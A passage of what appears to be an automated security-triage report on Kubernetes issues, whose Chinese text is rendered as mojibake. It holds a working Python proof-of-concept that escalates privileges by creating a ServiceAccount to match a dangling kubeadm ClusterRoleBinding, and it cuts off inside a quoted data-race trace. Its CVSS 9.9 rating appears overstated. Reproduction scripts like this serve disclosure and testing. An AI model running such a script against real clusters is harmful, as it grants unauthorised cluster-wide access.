SUPPORT_URL="https://ask.fedoraproject.org/"
BUG_REPORT_URL="https://bugzilla.redhat.com/"
REDHAT_BUGZILLA_PRODUCT="Fedora"
REDHAT_BUGZILLA_PRODUCT_VERSION=42
REDHAT_SUPPORT_PRODUCT="Fedora"
REDHAT_SUPPORT_PRODUCT_VERSION=42
SUPPORT_END=2026-05-13
VARIANT="Server Edition"
VARIANT_ID=server
root@localhost:~# uname -a
Linux localhost.localdomain 6.14.4-300.fc42.x86_64 #1 SMP PREEMPT_DYNAMIC Fri Apr 25 15:43:38 UTC 2025 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>
kubeadm-v1.32.4
</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
é«˜é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†ä¸€ä¸ªåœ¨æ–°åˆ›å»ºçš„Kubernetesé›†ç¾¤ä¸­å­˜åœ¨çš„æ½œåœ¨å®‰å…¨é£é™©ã€‚å…·ä½“æ¥è¯´ï¼Œ`kubeadm`åˆ›å»ºçš„ä¸€äº›é»˜è®¤`ClusterRoleBinding`èµ„æºï¼ˆ`system:controller:route-controller`, `system:controller:service-controller`, `system:kube-dns`ï¼‰æŒ‡å‘äº†ä¸å­˜åœ¨çš„`ServiceAccount`ã€‚

è¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„æƒé™æå‡ï¼ˆPrivilege Escalationï¼‰é£é™©åœºæ™¯ã€‚æ”»å‡»åœºæ™¯å¦‚ä¸‹ï¼š

1.  **å‰ææ¡ä»¶**ï¼šæ”»å‡»è€…éœ€è¦è·å¾—åœ¨`kube-system`å‘½åç©ºé—´ä¸­åˆ›å»º`ServiceAccount`çš„æƒé™ã€‚è™½ç„¶è¿™ä¸ªæƒé™æœ¬èº«ä¸ä½ï¼Œä½†åœ¨å¤æ‚çš„ç¯å¢ƒä¸­ï¼Œå¯èƒ½ç”±äºé”™è¯¯çš„é…ç½®ã€æˆ–è€…åˆ©ç”¨äº†å…¶ä»–æ¼æ´ï¼Œå¯¼è‡´æ”»å‡»è€…è·å¾—äº†è¿™ä¸ªæƒé™ã€‚
2.  **æ”»å‡»æ­¥éª¤**ï¼šä¸€æ—¦æ”»å‡»è€…æ‹¥æœ‰äº†ä¸Šè¿°æƒé™ï¼Œä»–ä»¬å°±å¯ä»¥åœ¨`kube-system`å‘½åç©ºé—´ä¸­åˆ›å»ºä¸€ä¸ªä¸æ‚¬ç©ºï¼ˆdanglingï¼‰çš„`ClusterRoleBinding`æ‰€å¼•ç”¨çš„`ServiceAccount`åŒåçš„`ServiceAccount`ï¼ˆä¾‹å¦‚ï¼Œ`kube-dns`ï¼‰ã€‚
3.  **æ”»å‡»ç»“æœ**ï¼šæ–°åˆ›å»ºçš„`ServiceAccount`ä¼šç«‹å³è‡ªåŠ¨ç»§æ‰¿`ClusterRoleBinding`æ‰€ç»‘å®šçš„`ClusterRole`ä¸­å®šä¹‰çš„æƒé™ã€‚è¿™äº›`ClusterRole`ï¼ˆå¦‚`system:kube-dns`ï¼‰é€šå¸¸åŒ…å«éå¸¸é«˜çš„æƒé™ï¼Œä¾‹å¦‚åˆ—å‡ºé›†ç¾¤ä¸­æ‰€æœ‰çš„`Pod`å’Œ`Service`ã€‚æ”»å‡»è€…é€šè¿‡åˆ›å»ºä¸€ä¸ª`ServiceAccount`ï¼Œå…¶æƒé™å°±ä»"åœ¨ç‰¹å®šå‘½åç©ºé—´åˆ›å»ºSA"æå‡åˆ°äº†"æ‹¥æœ‰å¼ºå¤§çš„é›†ç¾¤çº§è¯»æƒé™"ï¼Œä»è€Œå¯ä»¥è·å–æ•´ä¸ªé›†ç¾¤çš„æ¶æ„ä¿¡æ¯ï¼Œä¸ºåç»­æ”»å‡»é“ºå¹³é“è·¯ã€‚

æ ¹æ®CVSS 3.1è¯„åˆ†æ ‡å‡†ï¼š
*   **Attack Vector (AV): Network (N)**ï¼šæ”»å‡»å‘ç”Ÿåœ¨é›†ç¾¤ç½‘ç»œå†…éƒ¨ã€‚
*   **Attack Complexity (AC): Low (L)**ï¼šä¸€æ—¦è·å¾—å‰ç½®æƒé™ï¼Œåˆ©ç”¨æ–¹å¼éå¸¸ç®€å•ï¼Œåªéœ€åˆ›å»ºä¸€ä¸ªèµ„æºã€‚
*   **Privileges Required (PR): Low (L)**ï¼šè™½ç„¶è¦æ±‚èƒ½åœ¨`kube-system`ä¸­åˆ›å»º`ServiceAccount`ï¼Œä½†è¿™è¢«è§†ä¸ºæƒé™æå‡æ¼æ´çš„èµ·ç‚¹æƒé™ã€‚æ”»å‡»è€…ä»ä¸€ä¸ªè¾ƒä½çš„æƒé™ï¼ˆå³ä½¿æ˜¯`kube-system`çš„å†™æƒé™ï¼Œä¹Ÿä½äºç›®æ ‡`ClusterRole`çš„æƒé™ï¼‰æå‡åˆ°ä¸€ä¸ªæ›´é«˜çš„æƒé™ã€‚
*   **User Interaction (UI): None (N)**ï¼šæ— éœ€ç”¨æˆ·äº¤äº’ã€‚
*   **Scope (S): Changed (C)**ï¼šæ¼æ´åˆ©ç”¨æˆåŠŸåï¼Œæ”»å‡»è€…çš„æƒé™èŒƒå›´ä»ä¸€ä¸ªå‘½åç©ºé—´ï¼ˆ`kube-system`ï¼‰æ‰©å±•åˆ°äº†æ•´ä¸ªé›†ç¾¤ï¼ˆcluster-wideï¼‰ã€‚
*   **Confidentiality (C): High (H)**ï¼š`system:kube-dns`ç­‰è§’è‰²å…è®¸è¯»å–é›†ç¾¤èŒƒå›´å†…çš„`pods`, `services`, `endpoints`ç­‰æ•æ„Ÿä¿¡æ¯ã€‚
*   **Integrity (I): High (H)**ï¼š`system:controller:service-controller`ç­‰è§’è‰²å…è®¸ä¿®æ”¹`services`ç­‰å…³é”®èµ„æºï¼Œå¯èƒ½å¯¼è‡´æµé‡åŠ«æŒã€‚
*   **Availability (A): High (H)**ï¼šåŒä¸Šï¼Œä¿®æ”¹æˆ–åˆ é™¤å…³é”®æœåŠ¡ä¼šå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚

ç»¼åˆè¯„åˆ†ï¼ˆ`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`ï¼‰ä¸º **9.9 (Critical)**ã€‚æ ¹æ®è§„åˆ™#7ï¼Œæ­¤ç±»æƒé™æå‡æ¼æ´åº”è¢«è¯„ä¸ºé«˜é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import sys
import time
import kubernetes.client
from kubernetes import config
from kubernetes.client.rest import ApiException

# é…ç½®ä¿¡æ¯
TARGET_NAMESPACE = "kube-system"
EXPLOIT_BINDINGS = {
    "system:controller:route-controller": "route-controller",
    "system:controller:service-controller": "service-controller",
    "system:kube-dns": "kube-dns",
}
# é€‰æ‹©å…¶ä¸­ä¸€ä¸ªè¿›è¡Œå¤ç°
TARGET_CRB, TARGET_SA_NAME = "system:kube-dns", "kube-dns"
# ç”¨äºæƒé™éªŒè¯çš„ SubjectAccessReview
SA_USER = f"system:serviceaccount:{TARGET_NAMESPACE}:{TARGET_SA_NAME}"
PRIVILEGE_CHECK = kubernetes.client.V1SubjectAccessReview(
    spec=kubernetes.client.V1SubjectAccessReviewSpec(
        resource_attributes=kubernetes.client.V1ResourceAttributes(
            verb="list",
            resource="pods",
            group="",
            namespace=""  # ç©ºå­—ç¬¦ä¸²è¡¨ç¤ºæ‰€æœ‰å‘½åç©ºé—´
        ),
        user=SA_USER
    )
)

def main():
    """
    ä¸»æ‰§è¡Œå‡½æ•°
    """
    try:
        # ä»é»˜è®¤ä½ç½®åŠ è½½kubeconfig
        print("[-] æ­£åœ¨ä»é»˜è®¤ä½ç½® (~/.kube/config) åŠ è½½ Kubernetes é…ç½®...")
        config.load_kube_config()
        print("[+] Kubernetes é…ç½®åŠ è½½æˆåŠŸ.")
    except Exception as e:
        print(f"[!] åŠ è½½ Kubernetes é…ç½®å¤±è´¥: {e}", file=sys.stderr)
        print("[!] è¯·ç¡®ä¿æ‚¨çš„ kubeconfig æ–‡ä»¶å·²æ­£ç¡®é…ç½®åœ¨é»˜è®¤è·¯å¾„ä¸‹ã€‚", file=sys.stderr)
        sys.exit(1)

    # åˆ›å»ºAPIå®¢æˆ·ç«¯
    core_v1 = kubernetes.client.CoreV1Api()
    rbac_v1 = kubernetes.client.RbacAuthorizationV1Api()
    auth_v1 = kubernetes.client.AuthorizationV1Api()

    # 1. éªŒè¯æ¼æ´å‰ææ¡ä»¶
    print("\n--- æ­¥éª¤ 1: éªŒè¯æ¼æ´å‰ææ¡ä»¶ ---")
    try:
        print(f"[-] æ£€æŸ¥ ClusterRoleBinding '{TARGET_CRB}' æ˜¯å¦å­˜åœ¨...")
        rbac_v1.read_cluster_role_binding(name=TARGET_CRB)
        print(f"[+] ç¡®è®¤: ClusterRoleBinding '{TARGET_CRB}' å­˜åœ¨ã€‚")

        print(f"[-] æ£€æŸ¥ ServiceAccount '{TARGET_SA_NAME}' æ˜¯å¦åœ¨ '{TARGET_NAMESPACE}' å‘½åç©ºé—´ä¸­å­˜åœ¨...")
        try:
            core_v1.read_namespaced_service_account(name=TARGET_SA_NAME, namespace=TARGET_NAMESPACE)
            print(f"[!] è­¦å‘Š: ServiceAccount '{TARGET_SA_NAME}' å·²å­˜åœ¨ï¼Œæ— æ³•å¤ç°ã€‚å¯èƒ½å·²è¢«ä¿®å¤æˆ–æ‰‹åŠ¨åˆ›å»ºã€‚", file=sys.stderr)
            sys.exit(0)
        except ApiException as e:
            if e.status == 404:
                print(f"[+] ç¡®è®¤: ServiceAccount '{TARGET_SA_NAME}' ä¸å­˜åœ¨ã€‚æ»¡è¶³æ¼æ´æ¡ä»¶ã€‚")
            else:
                raise

    except ApiException as e:
        if e.status == 404:
            print(f"[!] é”™è¯¯: ClusterRoleBinding '{TARGET_CRB}' ä¸å­˜åœ¨ã€‚æ‚¨çš„é›†ç¾¤å¯èƒ½ä¸å—æ­¤é—®é¢˜å½±å“ã€‚", file=sys.stderr)
        else:
            print(f"[!] æ£€æŸ¥å‰ææ¡ä»¶æ—¶å‘ç”ŸAPIé”™è¯¯: {e}", file=sys.stderr)
        sys.exit(1)

    # 2. æ£€æŸ¥åˆ©ç”¨å‰çš„æƒé™
    print("\n--- æ­¥éª¤ 2: åœ¨åˆ›å»ºServiceAccountå‰æ£€æŸ¥å…¶æƒé™ ---")
    print(f"[-] æ£€æŸ¥æ¨¡æ‹Ÿç”¨æˆ· '{SA_USER}' æ˜¯å¦æœ‰æƒé™åˆ—å‡ºæ‰€æœ‰Pods...")
    review_before = auth_v1.create_subject_access_review(PRIVILEGE_CHECK)
    if not review_before.status.allowed:
        print(f"[+] ç¡®è®¤: æƒé™æ£€æŸ¥è¿”å› 'allowed: false'ã€‚æ¨¡æ‹Ÿç”¨æˆ·å½“å‰æ²¡æœ‰æƒé™ã€‚è¿™æ˜¯é¢„æœŸçš„ç»“æœã€‚")
    else:
        print(f"[!] è­¦å‘Š: æƒé™æ£€æŸ¥è¿”å› 'allowed: true'ã€‚å­˜åœ¨éé¢„æœŸçš„æƒé™é…ç½®ã€‚", file=sys.stderr)

    # 3. æ‰§è¡Œåˆ©ç”¨ï¼šåˆ›å»ºServiceAccount
    print("\n--- æ­¥éª¤ 3: æ‰§è¡Œæ¼æ´åˆ©ç”¨ ---")
    sa_body = kubernetes.client.V1ServiceAccount(
        metadata=kubernetes.client.V1ObjectMeta(name=TARGET_SA_NAME)
    )
    try:
        print(f"[*] æ­£åœ¨ '{TARGET_NAMESPACE}' å‘½åç©ºé—´ä¸­åˆ›å»ºæ¶æ„çš„ ServiceAccount '{TARGET_SA_NAME}'...")
        core_v1.create_namespaced_service_account(namespace=TARGET_NAMESPACE, body=sa_body)
        print(f"[+] ServiceAccount '{TARGET_SA_NAME}' åˆ›å»ºæˆåŠŸã€‚")
        # ç­‰å¾…SAç”Ÿæ•ˆ
        time.sleep(2)
    except ApiException as e:
        print(f"[!] åˆ›å»º ServiceAccount å¤±è´¥: {e}", file=sys.stderr)
        print("[!] è¯·ç¡®ä¿æ‚¨å½“å‰ä¸Šä¸‹æ–‡çš„å‡­æ®æ‹¥æœ‰åœ¨ 'kube-system' å‘½åç©ºé—´ä¸­åˆ›å»º ServiceAccount çš„æƒé™ã€‚", file=sys.stderr)
        sys.exit(1)

    # 4. éªŒè¯æƒé™æå‡ç»“æœ
    print("\n--- æ­¥éª¤ 4: éªŒè¯æƒé™æå‡ç»“æœ ---")
    try:
        print(f"[-] å†æ¬¡æ£€æŸ¥ç”¨æˆ· '{SA_USER}' æ˜¯å¦æœ‰æƒé™åˆ—å‡ºæ‰€æœ‰Pods...")
        review_after = auth_v1.create_subject_access_review(PRIVILEGE_CHECK)
        if review_after.status.allowed:
            print(f"[+] é«˜é£é™©æ¼æ´å·²ç¡®è®¤! æƒé™æ£€æŸ¥è¿”å› 'allowed: true'ã€‚")
            print(f"[+] é€šè¿‡åˆ›å»ºServiceAccount '{TARGET_SA_NAME}'ï¼ŒæˆåŠŸç»§æ‰¿äº†'{TARGET_CRB}'ç»‘å®šçš„é›†ç¾¤çº§æƒé™ã€‚")
        else:
            print(f"[!] æ¼æ´å¤ç°å¤±è´¥ã€‚æƒé™æ£€æŸ¥ä»ç„¶è¿”å› 'allowed: false'ã€‚")

    finally:
        # 5. æ¸…ç†èµ„æº
        print("\n--- æ­¥éª¤ 5: æ¸…ç†èµ„æº ---")
        try:
            print(f"[*] æ­£åœ¨åˆ é™¤å·²åˆ›å»ºçš„ ServiceAccount '{TARGET_SA_NAME}'...")
            core_v1.delete_namespaced_service_account(name=TARGET_SA_NAME, namespace=TARGET_NAMESPACE)
            print("[+] æ¸…ç†å®Œæˆã€‚")
        except ApiException as e:
            print(f"[!] æ¸…ç† ServiceAccount å¤±è´¥: {e}", file=sys.stderr)

main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Pythonè„šæœ¬é€šè¿‡ä»¥ä¸‹æ­¥éª¤å¤ç°å¹¶éªŒè¯Issueä¸­æè¿°çš„é«˜é£é™©æ¼æ´ï¼š

1.  **åŠ è½½é…ç½®**: è„šæœ¬é¦–å…ˆä¼šåŠ è½½æœ¬åœ°çš„`~/.kube/config`æ–‡ä»¶æ¥è·å–ä¸Kubernetesé›†ç¾¤é€šä¿¡çš„å‡­æ®ã€‚
2.  **éªŒè¯å‰æ**:
    *   å®ƒä¼šç¡®è®¤ç›®æ ‡`ClusterRoleBinding`ï¼ˆæœ¬ä¾‹ä¸­ä¸º`system:kube-dns`ï¼‰ç¡®å®å­˜åœ¨ã€‚
    *   ç„¶åï¼Œå®ƒä¼šç¡®è®¤è¯¥`ClusterRoleBinding`æ‰€æŒ‡å‘çš„`ServiceAccount`ï¼ˆ`kube-dns`ï¼‰åœ¨`kube-system`å‘½åç©ºé—´ä¸­æ˜¯ä¸å­˜åœ¨çš„ã€‚
    *   è¿™ä¸¤ä¸ªæ¡ä»¶åŒæ—¶æ»¡è¶³ï¼Œæ‰è¯æ˜äº†æ¼æ´å­˜åœ¨çš„åŸºç¡€ã€‚
3.  **åˆ©ç”¨å‰æƒé™æ£€æŸ¥**: åœ¨è¿›è¡Œä»»ä½•æ“ä½œä¹‹å‰ï¼Œè„šæœ¬ä½¿ç”¨`SubjectAccessReview` APIæ¥æ£€æŸ¥ä¸€ä¸ªè™šæ‹Ÿçš„`ServiceAccount`ï¼ˆ`system:serviceaccount:kube-system:kube-dns`ï¼‰æ˜¯å¦æ‹¥æœ‰åˆ—å‡ºé›†ç¾¤æ‰€æœ‰Podçš„æƒé™ã€‚åœ¨SAè¢«åˆ›å»ºå‰ï¼Œè¿™ä¸ªæ£€æŸ¥é¢„æœŸä¼šå¤±è´¥ï¼ˆè¿”å›`allowed: false`ï¼‰ã€‚
4.  **æ‰§è¡Œåˆ©ç”¨**: è„šæœ¬åœ¨`kube-system`å‘½åç©ºé—´ä¸­åˆ›å»ºåä¸º`kube-dns`çš„`ServiceAccount`ã€‚è¿™æ˜¯åˆ©ç”¨æ¼æ´çš„æ ¸å¿ƒæ­¥éª¤ã€‚è¦æˆåŠŸæ‰§è¡Œæ­¤æ­¥ï¼Œè¿è¡Œè„šæœ¬çš„ç”¨æˆ·éœ€è¦æœ‰åœ¨`kube-system`ä¸­åˆ›å»º`ServiceAccount`çš„æƒé™ã€‚
5.  **éªŒè¯ç»“æœä¸æ¸…ç†**:
    *   åœ¨åˆ›å»º`ServiceAccount`åï¼Œè„šæœ¬ä¼šå†æ¬¡æ‰§è¡Œ`SubjectAccessReview`æ£€æŸ¥ã€‚å¦‚æœæ¼æ´å­˜åœ¨ä¸”è¢«æˆåŠŸåˆ©ç”¨ï¼Œè¿™æ¬¡æ£€æŸ¥åº”è¯¥ä¼šæˆåŠŸï¼ˆè¿”å›`allowed: true`ï¼‰ï¼Œè¯æ˜æ–°åˆ›å»ºçš„`ServiceAccount`å·²ç»é€šè¿‡`ClusterRoleBinding`è·å¾—äº†é›†ç¾¤çº§çš„æƒé™ï¼Œæƒé™æå‡æˆåŠŸã€‚
    *   æœ€åï¼Œæ— è®ºæˆåŠŸä¸å¦ï¼Œ`finally`å—éƒ½ä¼šå°è¯•åˆ é™¤ä¹‹å‰åˆ›å»ºçš„`ServiceAccount`ï¼Œä»¥æ¸…ç†ç¯å¢ƒï¼Œé¿å…ç•™ä¸‹å®‰å…¨éšæ‚£ã€‚

è¯¥è„šæœ¬æ¸…æ™°åœ°å±•ç¤ºäº†æ”»å‡»è€…å¦‚ä½•åˆ©ç”¨ä¸€ä¸ªæ‚¬ç©ºçš„`ClusterRoleBinding`ï¼Œé€šè¿‡åˆ›å»ºä¸€ä¸ªåŒå`ServiceAccount`æ¥å®Œæˆæƒé™æå‡ï¼Œä»è€Œå°†ä¸€ä¸ªçœ‹ä¼¼æ— å®³çš„é…ç½®é—®é¢˜è½¬åŒ–ä¸ºä¸€ä¸ªé«˜é£é™©çš„å®‰å…¨æ¼æ´ã€‚

---


# âš ï¸ å­˜åœ¨ä½é£é™©çš„ Issues (17 ä¸ª)

## Issue #132024 CEL typeprovider.go: DATA RACE

- Issue é“¾æ¥ï¼š[#132024](https://github.com/kubernetes/kubernetes/issues/132024)

### Issue å†…å®¹

#### What happened?

I have https://github.com/kubernetes/kubernetes/pull/116980 which runs integration tests with race detection enabled. Running it shows:
```
k8s.io/kubernetes/test/integration/apiserver: oidc
...
=== RUN   TestStructuredAuthenticationConfig/wrong_client_ID
...
WARNING: DATA RACE
Write at 0x00c000676d90 by goroutine 54598:
  k8s.io/apiserver/pkg/admission/plugin/cel.init.ResolverEnvOption.NewResolverTypeProviderAndEnvOption.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/cel/common/typeprovider.go:122 +0x4d
  k8s.io/apiserver/pkg/cel/environment.(*EnvSet).filterAndBuildOpts.Lib.func1()
      /home/prow/go/src/k8s.io/kubernetes/vendor/github.com/google/cel-go/cel/library.go:104 +0x1d0
  github.com/google/cel-go/cel.(*Env).configure()
      /home/prow/go/src/k8s.io/kubernetes/vendor/github.com/google/cel-go/cel/env.go:752 +0xa7
  github.com/google/cel-go/cel.(*Env).Extend()
      /home/prow/go/src/k8s.io/kubernetes/vendor/github.com/google/cel-go/cel/env.go:525 +0x13d4
  k8s.io/apiserver/pkg/cel/environment.(*EnvSet).Extend()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/cel/environment/environment.go:225 +0x126
  k8s.io/apiserver/pkg/admission/plugin/cel.createEnvForOpts()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/admission/plugin/cel/compile.go:289 +0xf35
  k8s.io/apiserver/pkg/admission/plugin/cel.mustBuildEnvs()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/admission/plugin/cel/compile.go:241 +0x186
  k8s.io/apiserver/pkg/admission/plugin/cel.NewCompiler()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/admission/plugin/cel/compile.go:160 +0x4c4
  k8s.io/apiserver/pkg/admission/plugin/cel.NewConditionCompiler()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/admission/plugin/cel/condition.go:39 +0x524
  k8s.io/apiserver/pkg/admission/plugin/webhook/generic.NewWebhook()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/admission/plugin/webhook/generic/webhook.go:105 +0x473
  k8s.io/apiserver/pkg/admission/plugin/webhook/validating.NewValidatingAdmissionWebhook()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/admission/plugin/webhook/validating/plugin.go:57 +0x194
  k8s.io/apiserver/pkg/server.RegisterAllAdmissionPlugins.Register.func2()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/admission/plugin/webhook/validating/plugin.go:36 +0x33
  k8s.io/apiserver/pkg/admission.(*Plugins).getPlugin()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/admission/plugins.go:107 +0x1d2
  k8s.io/apiserver/pkg/admission.(*Plugins).InitPlugin()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/admission/plugins.go:172 +0x150
  k8s.io/apiserver/pkg/admission.(*Plugins).NewFromPlugins()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/admission/plugins.go:137 +0x1bc
  k8s.io/apiserver/pkg/admission.(*Plugins).NewFromPlugins()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/admission/plugins.go:137 +0x1bc
  k8s.io/apiserver/pkg/server/options.(*AdmissionOptions).ApplyTo()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/server/options/admission.go:172 +0x85e
  k8s.io/kubernetes/pkg/kubeapiserver/options.(*AdmissionOptions).ApplyTo()
      /home/prow/go/src/k8s.io/kubernetes/pkg/kubeapiserver/options/admission.go:129 +0x2d2
  k8s.io/kubernetes/pkg/controlplane/apiserver.CreateConfig()
      /home/prow/go/src/k8s.io/kubernetes/pkg/controlplane/apiserver/config.go:367 +0x1598
  k8s.io/kubernetes/cmd/kube-apiserver/app.CreateKubeAPIServerConfig()
      /home/prow/go/src/k8s.io/kubernetes/cmd/kube-apiserver/app/server.go:221 +0x218
  k8s.io/kubernetes/cmd/kube-apiserver/app.NewConfig()
      /home/prow/go/src/k8s.io/kubernetes/cmd/kube-apiserver/app/config.go:89 +0x1f5
  k8s.io/kubernetes/cmd/kube-apiserver/app/testing.StartTestServer()
      /home/prow/go/src/k8s.io/kubernetes/cmd/kube-apiserver/app/testing/testserver.go:420 +0x58b2
  k8s.io/kubernetes/test/integration/apiserver/oidc.startTestAPIServerForOIDC[go.shape.*crypto/rsa.PublicKey]()
      /home/prow/go/src/k8s.io/kubernetes/test/integration/apiserver/oidc/oidc_test.go:1819 +0x75a
  k8s.io/kubernetes/test/integration/apiserver/oidc.configureTestInfrastructure[go.shape.*crypto/rsa.PrivateKey,go.shape.*crypto/rsa.PublicKey]()
      /home/prow/go/src/k8s.io/kubernetes/test/integration/apiserver/oidc/oidc_test.go:1745 +0x20f
  k8s.io/kubernetes/test/integration/apiserver/oidc.configureTestInfrastructure[*crypto/rsa.PrivateKey,*crypto/rsa.PublicKey]()
      /home/prow/go/src/k8s.io/kubernetes/test/integration/apiserver/oidc/oidc_test.go:1728 +0x58
  k8s.io/kubernetes/test/integration/apiserver/oidc.runTests.singleTestRunner[go.shape.*crypto/rsa.PrivateKey,go.shape.*crypto/rsa.PublicKey].func21()
      /home/prow/go/src/k8s.io/kubernetes/test/integration/apiserver/oidc/oidc_test.go:491 +0x1b1
  testing.tRunner()
      /usr/local/go/src/testing/testing.go:1792 +0x225
  testing.(*T).Run.gowrap1()
      /usr/local/go/src/testing/testing.go:1851 +0x44

Previous write at 0x00c000676d90 by goroutine 54596:
  k8s.io/apiserver/pkg/admission/plugin/cel.init.ResolverEnvOption.NewResolverTypeProviderAndEnvOption.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/cel/common/typeprovider.go:122 +0x4d
  k8s.io/apiserver/pkg/cel/environment.(*EnvSet).filterAndBuildOpts.Lib.func1()
      /home/prow/go/src/k8s.io/kubernetes/vendor/github.com/google/cel-go/cel/library.go:104 +0x1d0
  github.com/google/cel-go/cel.(*Env).configure()
      /home/prow/go/src/k8s.io/kubernetes/vendor/github.com/google/cel-go/cel/env.go:752 +0xa7
  github.com/google/cel-go/cel.(*Env).Extend()
      /home/prow/go/src/k8s.io/kubernetes/vendor/github.com/google/cel-go/cel/env.go:525 +0x13d4
  k8s.io/apiserver/pkg/cel/environment.(*EnvSet).Extend()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/cel/environment/environment.go:233 +0x2ae
  k8s.io/apiserver/pkg/admission/plugin/cel.createEnvForOpts()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/admission/plugin/cel/compile.go:289 +0xf35
  k8s.io/apiserver/pkg/admission/plugin/cel.mustBuildEnvs()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/admission/plugin/cel/compile.go:241 +0x186
  k8s.io/apiserver/pkg/admission/plugin/cel.NewCompiler()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/admission/plugin/cel/compile.go:160 +0x4c4
  k8s.io/apiserver/pkg/admission/plugin/cel.NewConditionCompiler()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/admission/plugin/cel/condition.go:39 +0x524
  k8s.io/apiserver/pkg/admission/plugin/webhook/generic.NewWebhook()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/admission/plugin/webhook/generic/webhook.go:105 +0x473
  k8s.io/apiserver/pkg/admission/plugin/webhook/mutating.NewMutatingWebhook()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/admission/plugin/webhook/mutating/plugin.go:57 +0x194
  k8s.io/apiserver/pkg/server.RegisterAllAdmissionPlugins.Register.func3()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/admission/plugin/webhook/mutating/plugin.go:36 +0x33
  k8s.io/apiserver/pkg/admission.(*Plugins).getPlugin()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/admission/plugins.go:107 +0x1d2
  k8s.io/apiserver/pkg/admission.(*Plugins).InitPlugin()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/admission/plugins.go:172 +0x150
  k8s.io/apiserver/pkg/admission.(*Plugins).NewFromPlugins()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/admission/plugins.go:137 +0x1bc
  k8s.io/apiserver/pkg/server/options.(*AdmissionOptions).ApplyTo()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/server/options/admission.go:172 +0x85e
  k8s.io/kubernetes/pkg/kubeapiserver/options.(*AdmissionOptions).ApplyTo()
      /home/prow/go/src/k8s.io/kubernetes/pkg/kubeapiserver/options/admission.go:129 +0x2d2
  k8s.io/kubernetes/pkg/controlplane/apiserver.CreateConfig()
      /home/prow/go/src/k8s.io/kubernetes/pkg/controlplane/apiserver/config.go:367 +0x1598
  k8s.io/kubernetes/cmd/kube-apiserver/app.CreateKubeAPIServerConfig()
      /home/prow/go/src/k8s.io/kubernetes/cmd/kube-apiserver/app/server.go:221 +0x218
  k8s.io/kubernetes/cmd/kube-apiserver/app.NewConfig()
      /home/prow/go/src/k8s.io/kubernetes/cmd/kube-apiserver/app/config.go:89 +0x1f5
  k8s.io/kubernetes/cmd/kube-apiserver/app/testing.StartTestServer()
      /home/prow/go/src/k8s.io/kubernetes/cmd/kube-apiserver/app/testing/testserver.go:420 +0x58b2
  k8s.io/kubernetes/test/integration/apiserver/oidc.startTestAPIServerForOIDC[go.shape.*crypto/rsa.PublicKey]()
      /home/prow/go/src/k8s.io/kubernetes/test/integration/apiserver/oidc/oidc_test.go:1819 +0x75a
  k8s.io/kubernetes/test/integration/apiserver/oidc.configureTestInfrastructure[go.shape.*crypto/rsa.PrivateKey,go.shape.*crypto/rsa.PublicKey]()
      /home/prow/go/src/k8s.io/kubernetes/test/integration/apiserver/oidc/oidc_test.go:1745 +0x20f
  k8s.io/kubernetes/test/integration/apiserver/oidc.configureTestInfrastructure[*crypto/rsa.PrivateKey,*crypto/rsa.PublicKey]()
      /home/prow/go/src/k8s.io/kubernetes/test/integration/apiserver/oidc/oidc_test.go:1728 +0x58
  k8s.io/kubernetes/test/integration/apiserver/oidc.runTests.singleTestRunner[go.shape.*crypto/rsa.PrivateKey,go.shape.*crypto/rsa.PublicKey].func21()
      /home/prow/go/src/k8s.io/kubernetes/test/integration/apiserver/oidc/oidc_test.go:491 +0x1b1
  testing.tRunner()
      /usr/local/go/src/testing/testing.go:1792 +0x225
  testing.(*T).Run.gowrap1()
      /usr/local/go/src/testing/testing.go:1851 +0x44

Goroutine 54598 (running) created at:
  testing.(*T).Run()
      /usr/local/go/src/testing/testing.go:1851 +0x8f2
  k8s.io/kubernetes/test/integration/apiserver/oidc.runTests()
